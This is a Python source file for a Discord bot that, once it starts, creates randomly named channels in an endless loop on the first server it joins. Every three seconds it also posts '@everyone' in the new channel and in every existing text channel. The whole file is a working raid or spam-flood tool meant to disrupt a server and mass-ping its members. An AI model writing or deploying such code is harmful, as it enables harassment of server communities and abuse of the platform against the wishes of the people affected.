# main.py

import discord
import random
import string
import asyncio
import config

# Getting all available intents
intents = discord.Intents.default()

# Setting necessary intents
intents.guilds = True
intents.messages = True

# Connecting to Discord with specified intents
client = discord.Client(intents=intents)

# Function for generating a random channel name
def generate_channel_name():
    # Generating a random sequence of 12 characters
    random_sequence = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return random_sequence

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    # Creating channels when the bot starts
    guild = client.guilds[0]  # Selecting the first server the bot is on
    await create_channels(guild)

async def send_to_all_channels(guild, message):
    for channel in guild.text_channels:
        try:
            await channel.send(message)
        except Exception as e:
            print(f"Failed to send message to channel {channel.name}: {e}")

async def create_channels(guild):
    while True:
        channel_name = generate_channel_name()
        new_channel = await guild.create_text_channel(channel_name)
        await asyncio.gather(
            new_channel.send('@everyone'),
            send_to_all_channels(guild, '@everyone')
        )
        await asyncio.sleep(3)
# Running the bot
client.run(config.TOKEN)
